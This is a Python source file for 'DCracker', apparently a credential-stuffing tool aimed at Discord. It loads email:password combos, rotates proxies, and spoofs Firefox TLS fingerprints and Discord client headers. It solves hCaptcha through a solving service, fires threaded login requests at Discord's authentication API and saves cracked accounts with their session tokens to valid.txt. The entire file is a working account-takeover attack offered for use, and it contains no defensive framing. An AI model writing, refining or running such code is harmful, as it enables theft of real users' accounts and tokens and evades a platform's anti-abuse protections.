import tls_client
from modules import logging, captcha
import json
import base64
import ctypes
import threading
import random
import os
import time

logger = logging.Logger()
config = json.load(open("assets/config.json", encoding="utf-8"))


class Misc:
    @staticmethod
    def _xsuper() -> dict:
        return {
            "os": "Windows",
            "browser": "Firefox",
            "device": "",
            "system_locale": "en-GB",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "browser_version": "119.0",
            "os_version": "10",
            "referrer": "https://www.google.com/",
            "referring_domain": "www.google.com",
            "search_engine": "google",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": config["program"]["client_build_number"],
            "client_event_source": None,
        }

    @staticmethod
    def _build() -> str:
        return base64.urlsafe_b64encode(json.dumps(Misc._xsuper()).encode()).decode()


class Cracker:
    def __init__(self):
        self.client = tls_client.Session(client_identifier="firefox_119")
        self.default_headers = {}
        self.name = "DCracker"
        self.version = "1.0.0"
        self.build = "16/11/2023"
        self.config = config
        self.errors = {
            429: "Ratelimited",
            401: "Invalid",
            403: "Locked",
            400: "Bad Request",
        }
        self.combos = len(open("%s/combos.txt" % (self.config["user"]["combo_dir"]), "r").read().splitlines())

    def _setTtitle(self):
        ctypes.windll.kernel32.SetConsoleTitleW(
            "%s | Version : %s | Build : %s | Combos : %s" % (self.name, self.version, self.build, self.combos)
        )

    def _clear(self):
        os.system("cls")

    def _pause(self):
        input()

    def _proxies(self):
        with open("assets/proxies.txt", "r") as f:
            proxies = f.read().splitlines()
        return random.choice(proxies)

    def _fingerprint(self):
        return self.client.get(
            "https://discord.com/api/v9/experiments", headers=self.default_headers
        ).json()["fingerprint"]

    def _check(self, token: str, captcha: bool) -> bool:
        return self.client.get(
            "https://discord.com/api/v9/users/@me/affinities/guilds",
            headers={"Authorization": token},
        ).status_code

    def _login(self, combo: str, captcha: bool) -> bool:
        try:
            self.email = combo.split(":")[0]
            self.password = combo.split(":")[1]

            json = {
                "login": self.email,
                "password": self.password,
                "undelete": False,
                "login_source": None,
                "gift_code_sku_id": None,
            }

            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
                "Accept": "*/*",
                "Accept-Language": "en-GB,en;q=0.5",
                "Content-Type": "application/json",
                "X-Super-Properties": Misc._build(),
                "X-Fingerprint": self._fingerprint(),
                "X-Discord-Locale": "en-GB",
                "X-Discord-Timezone": "Europe/London",
                "X-Debug-Options": "bugReporterEnabled",
                "Origin": "https://discord.com",
                "Connection": "keep-alive",
                "Referer": "https://discord.com/login",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            }
            self.client.headers.update(headers)

            self.proxy = self._proxies()

            if self.config["program"]["proxies"]:
                proxies = {"http": self.proxy, "https": self.proxy}
            else:
                proxies = None

            if captcha:
                self.client.headers["X-Captcha-Key"] = captcha.HCoptcha(
                    self.config["user"]["captcha_key"]
                )._getResult(
                    captcha.HCoptcha(self.config["user"]["captcha_key"])._createTask(self.proxy)
                )
            else:
                pass

            response = self.client.post(
                "https://discord.com/api/v9/auth/login",
                json=json,
                proxy=proxies,
            )
            if int(response.status_code) == 200:
                if self.config["program"]["debug"]:
                    logger._debug("%s -> %s" % (response.status_code, response.text))
                logger._success("Cracked -> [%s]" % (self.email))
                open("valid.txt", "a").write(
                    "%s:%s:%s\n" % (self.email, self.password, response.json()["token"])
                )
            elif int(response.status_code) == 429:
                if self.config["program"]["debug"]:
                    logger._debug("%s -> %s" % (response.status_code, response.text))
                logger._fail(
                    "%s Retrying After %s"
                    % (
                        self.errors[response.status_code],
                        response.json()["retry_after"] + 4,
                    )
                )
                time.sleep(response.json()["retry_after"] + random.randint(3, 5))
                Cracker()._login(combo=combo, captcha=False)
            elif int(response.status_code) == 400:
                if("captcha" in response.text):
                    logger._fail("Captcha Required, Retrying -> %s" % (self.email))
                else:
                    logger._fail("Bad Combo -> [%s]" % (combo))
                    open("invalid.txt", "a").write("%s:%s\n" % (self.email, self.password))
            else:
                if self.config["program"]["debug"]:
                    logger._debug("%s -> %s" % (response.status_code, response.text))
                logger._fail("Bad Combo -> [%s]" % (combo))
                open("invalid.txt", "a").write("%s:%s\n" % (self.email, self.password))
        except Exception as err:
            logger._error(err)

    def _run(self):
        with open("%s/combos.txt" % (self.config["user"]["combo_dir"]), "r") as f:
            combo = f.read().splitlines()
        for combination in combo:
            threading.Thread(target=Cracker()._login, args=(combination, False)).start()
        self._pause()


if __name__ == "__main__":
    cracker = Cracker()
    cracker._setTtitle()
    cracker._clear()
    logger._title("""
·▄▄▄▄   ▄▄· ▄▄▄   ▄▄▄·  ▄▄· ▄ •▄ ▄▄▄ .▄▄▄  
██▪ ██ ▐█ ▌▪▀▄ █·▐█ ▀█ ▐█ ▌▪█▌▄▌▪▀▄.▀·▀▄ █·
▐█· ▐█▌██ ▄▄▐▀▀▄ ▄█▀▀█ ██ ▄▄▐▀▀▄·▐▀▀▪▄▐▀▀▄ 
██. ██ ▐███▌▐█•█▌▐█ ▪▐▌▐███▌▐█.█▌▐█▄▄▌▐█•█▌
▀▀▀▀▀• ·▀▀▀ .▀  ▀ ▀  ▀ ·▀▀▀ ·▀  ▀ ▀▀▀ .▀  ▀
""")
    logger._info("Press Enter To Start")
    input()
    cracker._run()
